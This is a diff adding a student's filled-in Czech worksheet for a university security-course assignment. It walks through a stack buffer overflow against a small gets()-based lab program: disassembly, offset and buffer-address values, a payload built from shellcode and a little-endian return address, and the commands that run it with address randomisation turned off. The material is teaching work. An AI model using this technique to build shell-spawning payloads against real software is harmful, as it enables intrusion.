@@ -1,0 +1,138 @@
+###############################################################################
+#                                                                             #
+#                        BIS Projekt 2 2009/2010                              #
+#                                                                             #
+# Maximalni pocet bodu: 7b                                                    #
+# Deadline:                                                                   #
+# Kontakt: Martin Henzl  <ihenzl@fit.vutbr.cz>                                #
+#          Maros Barabas <ibarabas@fit.vutbr.cz>                              #
+# Popis ulohy: Program s nazvem "bis-02" nacita vstupni retezec a vypisuje    #
+#   pocet znaku. Vytvorte exploit vyuzivajuci buffer overflow, ktery po       #
+#   spusteni vypise Vase jmeno. Muzete k tomu vyuzit tento navod.             #
+#                                                                             #
+#   Pro lepsi pochopeni si nastudujte tuto stranku:                           #
+#     http://insecure.org/stf/smashstack.html                                 #
+#                                                                             #
+#     Soubor shellcode obsahuje kod, ktery spusti shell. Vasim ukolem je      #
+#     pouzit shellcode pro vytvoreni souboru payload, ktery je pak poslan na  #
+#     vstup napadeneho programu. Pokud budete pouzivat tento navod, doplnte   #
+#     do tohoto souboru prirazeni vsech hodnot, na ktere se ptame (napr.      #
+#     STUDENT_NAME, BUFFER_ADDRESS, atd.).                                    #
+#     Pokud se rozhodnete provest utok jinym zpusobem, vytvorte novy soubor   #
+#     postup.txt, ve kterem Vas postup popisete.                              #
+#                                                                             #
+# Format odevzdani: Soubory payload a postup.txt v archivu xloginXX.[zip,tar] #
+# 	Program je zkompilovan a bude testovan na serveru merlin.fit.vutbr.cz #
+#                                                                             #
+# POZOR !                                                                     #
+# Projekt reste samostatne, jakekoliv opisovani povede k disciplinarni        #
+# komisi a k hodnoceni 0b. I nekompletni reseni se hodnoti kladne.            #
+#                                                                             #
+###############################################################################
+
+STUDENT_NAME=Petr Zemek
+STUDENT_LOGIN=xzemek02
+
+# Tip:
+# -----------------------------------------------------------------------------
+# Nastudujte si:
+# $ objdump -D -m i386 -b binary shellcode |less # Co shellcode dela?
+# $ less /usr/include/asm/unistd*                # Co za syscall je $0xb?
+
+# Zdrojovy kod programu "bis-02":
+# -----------------------------------------------------------------------------
+#	#include <stdio.h>
+#	#include <string.h>
+#
+#	int length()
+#	{
+#   	unsigned char buffer[BUFFER_LENGTH];
+#
+#       gets(buffer);
+#       return (int)strnlen(buffer, BUFFER_LENGTH);
+#	}
+#
+#   int main()
+#   {
+#   	printf("->");
+#       printf("Pocet znaku vstupniho textu je %d.\n", length());
+#       return 0;
+#   }
+#
+
+# Krok #1
+# -----------------------------------------------------------------------------
+# Program spustte prikazem "(exec -c ./setarch i386 -R ./bis-02)", v jinem shellu
+# spustte debugger na bezici program (ktery ceka na vstup):
+# "$ gdb ./bis-02 $(pgrep -u `whoami` bis-02)".
+# V bezicim gdb pomoci prikazu disassemble zjistete instrukce funkce length()
+# Uzitecnou cast tohoto vypisu napiste mezi nasledujici tagy:
+# ---// DISASSEMBLE LENGTH //---
+0x080483f4 <length+0>:  push   %ebp
+0x080483f5 <length+1>:  mov    %esp,%ebp
+0x080483f7 <length+3>:  sub    $0x248,%esp
+0x080483fd <length+9>:  lea    -0x240(%ebp),%eax
+0x08048403 <length+15>: mov    %eax,(%esp)
+0x08048406 <length+18>: call   0x80482d8 <gets@plt>
+0x0804840b <length+23>: movl   $0x240,0x4(%esp)
+0x08048413 <length+31>: lea    -0x240(%ebp),%eax
+0x08048419 <length+37>: mov    %eax,(%esp)
+0x0804841c <length+40>: call   0x8048308 <strnlen@plt>
+0x08048421 <length+45>: leave
+0x08048422 <length+46>: ret
+# ---// DISASSEMBLE LENGTH //---
+#
+# Krok #2
+# -----------------------------------------------------------------------------
+# Hledame offset navratove adresy &ret od zacatku bufferu. (v tomto ukazkovem
+# postupu jsou pouzity jine hodnoty, takze se na ne nespolehejte).
+#
+# instrucke push zmensi esp o 4B => %esp = &ret - 4:
+#	  push   %ebp
+# do ebp se nacita esp, tedy %ebp = &ret - 4:
+#	  mov    %esp,%ebp
+# alokace mista pro lokalni promenne:
+#	  sub    $0x68,%esp
+# gets() buffer zacina na %ebp - 0x4c == &ret -0x50
+#	  lea    -0x4c(%ebp),%eax
+#	  mov    %eax,(%esp)
+#	  call   8048344 <gets@plt>
+OFFSET=0x244
+
+# Krok #3
+# -----------------------------------------------------------------------------
+# Nastavte breakpoint na prvni instrukci (adresu) po navratu z funkce gets()
+# TIP: (gdb) help break
+BREAKPOINT_ADDRESS=0x0804840b
+
+# Postupujte prikazem continue pro navrat z funkce call (v druhem
+# shellu musite zadat vstup programu). Prikazem "(gdb) p/x $ebp -<akt. offset>"
+# (v nasem pripade p/x $ebp -0x4c) zjistime skutecnou adresu bufferu.
+BUFFER_ADDRESS=0xffffdc38
+
+# Krok #4
+# -----------------------------------------------------------------------------
+# Vytvoreni pre_payloadu pro exploit
+# Potrebujeme adresu bufferu na nami vypocitanem offsete (v nasem pripade 0x50).
+# POZOR: gets() cte vstup jen po znak '\n' nebo EOF, takze potrebujeme naplnit
+# stdin jinymi znaky. Na zacatek pre_payloadu dame soubor "shellcode" a doplnime
+# pre_payload tak, aby jeho delka odpovidala offsetu.
+#
+# Nakonec do pre_payloadu pridame adresu bufferu z kroku #3
+# (pozor na little-endian!).
+# TIP: http://en.wikipedia.org/wiki/Endianness
+# Prikazem wc zjistete velikost souboru pre_payload v bytech.
+PPL_SIZE=584
+
+# Krok #5
+# -----------------------------------------------------------------------------
+# Vytvorime payload soubor, ktery bude slouzit jako vstup pro nas exploit. Do
+# prikazu echo pridejte Vase jmeno.
+# (cat pre_payload ; yes '' | head -n 20000; echo 'echo "Petr Zemek"') > payload
+
+# Krok #7
+# -----------------------------------------------------------------------------
+# Spusteni exploitu:
+# (exec -c ./setarch i386 -R ./bis-02 < `echo $PWD`/payload)
+# TIP: prikaz setarch -R rusi randomizaci pameti, nastudujte si, proc je
+# tady pouzit: http://linux.die.net/man/8/setarch
